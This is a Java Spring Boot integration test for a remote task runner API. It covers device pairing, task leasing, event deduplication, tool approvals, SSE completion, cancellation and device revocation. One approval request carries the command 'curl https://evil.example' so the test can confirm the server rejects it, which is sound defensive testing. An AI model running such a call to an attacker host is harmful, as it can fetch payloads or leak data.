package io.github.jvpgjava.creatingj.integration;

import io.github.jvpgjava.creatingj.bootstrap.CreatingjBackendApplication;
import io.github.jvpgjava.creatingj.common.application.port.out.ClockPort;
import io.github.jvpgjava.creatingj.device.adapter.in.web.security.DeviceAuthenticationFilter;
import io.github.jvpgjava.creatingj.identity.application.port.out.PasswordHasherPort;
import io.github.jvpgjava.creatingj.identity.application.port.out.UserStorePort;
import io.github.jvpgjava.creatingj.identity.domain.Email;
import io.github.jvpgjava.creatingj.identity.domain.Role;
import io.github.jvpgjava.creatingj.identity.domain.User;
import io.github.jvpgjava.creatingj.identity.domain.UserId;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.condition.EnabledIfEnvironmentVariable;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.webmvc.test.autoconfigure.AutoConfigureMockMvc;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;
import tools.jackson.databind.JsonNode;
import tools.jackson.databind.ObjectMapper;

import java.util.Set;
import java.util.UUID;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

@SpringBootTest(classes = CreatingjBackendApplication.class)
@AutoConfigureMockMvc
@ActiveProfiles("postgres-it")
@EnabledIfEnvironmentVariable(named = "CREATINGJ_DB_URL", matches = "jdbc:postgresql:.*")
class RunnerRemoteTasksPostgresIT {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private JdbcTemplate jdbcTemplate;

    @Autowired
    private UserStorePort userStore;

    @Autowired
    private PasswordHasherPort passwordHasher;

    @Autowired
    private ClockPort clock;

    @Autowired
    private ObjectMapper objectMapper;

    private String tokenUserA;
    private String tokenUserB;

    @BeforeEach
    void resetAndSeed() throws Exception {
        jdbcTemplate.execute(
                "TRUNCATE TABLE tool_approvals, task_events, remote_tasks, device_credentials, "
                        + "device_pairing_challenges, devices, agent_tool_proposals, agent_runs, "
                        + "knowledge_index_jobs, knowledge_chunks, knowledge_sources, projects, "
                        + "usage_records, user_quotas, generations, messages, conversations, "
                        + "authorization_codes, audit_events, sessions, invitations, user_roles, users CASCADE");

        userStore.save(User.active(
                UserId.newId(), Email.of("alice.runner@creatingj.dev"), "Alice Runner",
                passwordHasher.hash("AliceStr0ng!2026"), Set.of(Role.MEMBER), null, clock.now()));
        userStore.save(User.active(
                UserId.newId(), Email.of("bob.runner@creatingj.dev"), "Bob Runner",
                passwordHasher.hash("BobStr0ng!2026"), Set.of(Role.MEMBER), null, clock.now()));

        tokenUserA = login("alice.runner@creatingj.dev", "AliceStr0ng!2026");
        tokenUserB = login("bob.runner@creatingj.dev", "BobStr0ng!2026");
    }

    @Test
    void shouldRunFullDevicePairingLeaseApprovalsSseCancellationAndRevocationFlow() throws Exception {
        String challengeBody = mockMvc.perform(post("/api/v1/devices/pairing-challenges")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + tokenUserA)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"deviceName\":\"Notebook Joao\",\"platform\":\"WINDOWS\"}"))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.pairingCode").isNotEmpty())
                .andReturn().getResponse().getContentAsString();
        String pairingCode = objectMapper.readTree(challengeBody).path("pairingCode").asString();

        String pairBody = mockMvc.perform(post("/api/v1/runner/pair/complete")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"pairingCode\":\"" + pairingCode + "\"}"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.deviceToken").isNotEmpty())
                .andExpect(jsonPath("$.device.status").value("ACTIVE"))
                .andReturn().getResponse().getContentAsString();
        JsonNode pairJson = objectMapper.readTree(pairBody);
        String deviceId = pairJson.path("device").path("id").asString();
        String deviceToken = pairJson.path("deviceToken").asString();

        mockMvc.perform(post("/api/v1/runner/pair/complete")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"pairingCode\":\"" + pairingCode + "\"}"))
                .andExpect(status().isUnauthorized())
                .andExpect(jsonPath("$.code").value("UNAUTHORIZED"));

        mockMvc.perform(get("/api/v1/projects")
                        .header(DeviceAuthenticationFilter.DEVICE_TOKEN_HEADER, deviceToken))
                .andExpect(status().isUnauthorized());

        mockMvc.perform(post("/api/v1/runner/heartbeat")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + tokenUserA))
                .andExpect(status().isForbidden());

        jdbcTemplate.update(
                "UPDATE devices SET last_heartbeat_at = NOW() - INTERVAL '5 minutes' WHERE id = ?",
                UUID.fromString(deviceId)
        );

        String taskPayload = """
                {
                  "deviceId": "%s",
                  "idempotencyKey": "task-key-01",
                  "title": "Aplicar patch",
                  "instruction": "Atualizar classe e rodar testes"
                }
                """.formatted(deviceId);

        String createdBody = mockMvc.perform(post("/api/v1/tasks")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + tokenUserA)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(taskPayload))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.deviceOnline").value(false))
                .andExpect(jsonPath("$.deduplicated").value(false))
                .andExpect(jsonPath("$.task.status").value("QUEUED"))
                .andReturn().getResponse().getContentAsString();
        String taskId = objectMapper.readTree(createdBody).path("task").path("id").asString();

        mockMvc.perform(post("/api/v1/tasks")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + tokenUserA)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(taskPayload))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.deduplicated").value(true))
                .andExpect(jsonPath("$.task.id").value(taskId));

        mockMvc.perform(post("/api/v1/runner/heartbeat")
                        .header(DeviceAuthenticationFilter.DEVICE_TOKEN_HEADER, deviceToken))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.online").value(true));

        mockMvc.perform(post("/api/v1/runner/tasks/lease")
                        .header(DeviceAuthenticationFilter.DEVICE_TOKEN_HEADER, deviceToken))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.assigned").value(true))
                .andExpect(jsonPath("$.task.id").value(taskId))
                .andExpect(jsonPath("$.task.status").value("LEASED"));

        mockMvc.perform(post("/api/v1/runner/tasks/" + taskId + "/events")
                        .header(DeviceAuthenticationFilter.DEVICE_TOKEN_HEADER, deviceToken)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"eventKey\":\"ev-1\",\"message\":\"Executando build\"}"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.deduplicated").value(false));

        mockMvc.perform(post("/api/v1/runner/tasks/" + taskId + "/events")
                        .header(DeviceAuthenticationFilter.DEVICE_TOKEN_HEADER, deviceToken)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"eventKey\":\"ev-1\",\"message\":\"Executando build\"}"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.deduplicated").value(true));

        mockMvc.perform(post("/api/v1/runner/tasks/" + taskId + "/approvals")
                        .header(DeviceAuthenticationFilter.DEVICE_TOKEN_HEADER, deviceToken)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"toolName\":\"RUN_COMMAND\",\"commandText\":\"curl https://evil.example\"}"))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.code").value("VALIDATION_ERROR"));

        String approvalBody = mockMvc.perform(post("/api/v1/runner/tasks/" + taskId + "/approvals")
                        .header(DeviceAuthenticationFilter.DEVICE_TOKEN_HEADER, deviceToken)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("""
                                {
                                  "toolName": "WRITE_FILE",
                                  "targetPath": "src/App.java",
                                  "diffPreview": "@@ -1 +1 @@\\n+public class App {}",
                                  "ttlSeconds": 180
                                }
                                """))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.status").value("PENDING"))
                .andReturn().getResponse().getContentAsString();
        String approvalId = objectMapper.readTree(approvalBody).path("id").asString();

        mockMvc.perform(get("/api/v1/tasks/" + taskId)
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + tokenUserB))
                .andExpect(status().isNotFound());

        mockMvc.perform(post("/api/v1/tasks/" + taskId + "/approvals/" + approvalId + "/decision")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + tokenUserA)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"action\":\"APPROVE\"}"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.approval.status").value("APPROVED"))
                .andExpect(jsonPath("$.task.status").value("RUNNING"));

        mockMvc.perform(post("/api/v1/tasks/" + taskId + "/approvals/" + approvalId + "/decision")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + tokenUserA)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"action\":\"APPROVE\"}"))
                .andExpect(status().isConflict())
                .andExpect(jsonPath("$.code").value("INVALID_STATE"));

        mockMvc.perform(post("/api/v1/runner/tasks/" + taskId + "/complete")
                        .header(DeviceAuthenticationFilter.DEVICE_TOKEN_HEADER, deviceToken)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"succeeded\":true,\"resultSummary\":\"Patch aplicado e testes verdes\"}"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.status").value("COMPLETED"));

        String sseBody = mockMvc.perform(get("/api/v1/tasks/" + taskId + "/events/stream")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + tokenUserA))
                .andExpect(status().isOk())
                .andReturn().getResponse().getContentAsString();
        assertThat(sseBody).contains("event:task_completed");

        String cancelPayload = "{\"deviceId\":\"" + deviceId
                + "\",\"title\":\"Cancelar\",\"instruction\":\"Teste\"}";
        String task2Body = mockMvc.perform(post("/api/v1/tasks")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + tokenUserA)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(cancelPayload))
                .andExpect(status().isCreated())
                .andReturn().getResponse().getContentAsString();
        String task2Id = objectMapper.readTree(task2Body).path("task").path("id").asString();

        mockMvc.perform(post("/api/v1/tasks/" + task2Id + "/cancel")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + tokenUserA))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.status").value("CANCELLED"));

        mockMvc.perform(post("/api/v1/devices/" + deviceId + "/revoke")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + tokenUserA))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.status").value("REVOKED"));

        mockMvc.perform(post("/api/v1/runner/heartbeat")
                        .header(DeviceAuthenticationFilter.DEVICE_TOKEN_HEADER, deviceToken))
                .andExpect(status().isUnauthorized());

        mockMvc.perform(post("/api/v1/tasks")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + tokenUserA)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"deviceId\":\"" + deviceId + "\",\"title\":\"Blocked\",\"instruction\":\"Nope\"}"))
                .andExpect(status().isConflict())
                .andExpect(jsonPath("$.code").value("INVALID_STATE"));
    }

    private String login(String email, String password) throws Exception {
        String body = mockMvc.perform(post("/api/v1/auth/login")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"email\":\"" + email + "\",\"password\":\"" + password + "\"}"))
                .andExpect(status().isOk())
                .andReturn().getResponse().getContentAsString();
        return objectMapper.readTree(body).path("accessToken").asString();
    }
}
